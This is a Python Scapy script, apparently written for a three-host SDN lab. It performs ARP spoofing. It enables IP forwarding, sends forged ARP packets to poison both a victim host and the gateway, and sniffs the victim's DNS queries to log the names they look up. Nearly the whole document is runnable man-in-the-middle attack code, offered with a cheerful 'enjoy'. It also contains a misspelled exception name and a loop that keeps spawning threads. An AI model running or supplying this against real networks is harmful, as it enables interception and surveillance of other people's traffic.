# ARP SPOOFING the SDN Environment created topology consisting of 3 hosts wherein host1 is the attacker and spoofs the traffic between host 2 and host 3
#Python Source code:

from scapy.all import *
import sys
import os
import time
import threading
victimIP = "10.0.0.3"
GatewayIP = "10.0.0.1"
IFACE = "h1-eth0"
print '\nMake sure you are running as root!, and enjoy. '
 
print '\t\t\nspoofing VictimClient & Gateway! .. '
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #Ensure the victim recieves packets by forwarding them
 
def dnshandle(pkt):
                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: #Strip what information you need from the packet capture
                        print 'Victim: ' + victimIP + ' has searched for: ' + pkt.getlayer(DNS).qd.qname
 
 
def v_spoof():
        v = ARP(pdst=victimIP, psrc=GatewayIP)
        while True:
                try:   
                       send(v,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:                     # Functions constructing and sending the ARP packets
                         sys.exit(1)
def gw_spoof():
        gw = ARP(pdst=GatewayIP, psrc=victimIP)
        while True:
                try:
                       send(gw,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:
                        sys.exit(1)
 
vthread = []
gwthread = []  
 
 
while True:     # Threads

        vspoof = threading.Thread(target=v_spoof)
        vspoof.setDaemon(True)
        vthread.append(vspoof)
        vspoof.start()        

        gwspoof = threading.Thread(target=gw_spoof)
        gwspoof.setDaemon(True)
        gwthread.append(gwspoof)
        gwspoof.start()
 

        pkt = sniff(iface=IFACE,filter='udp port 53',prn=dnshandle)

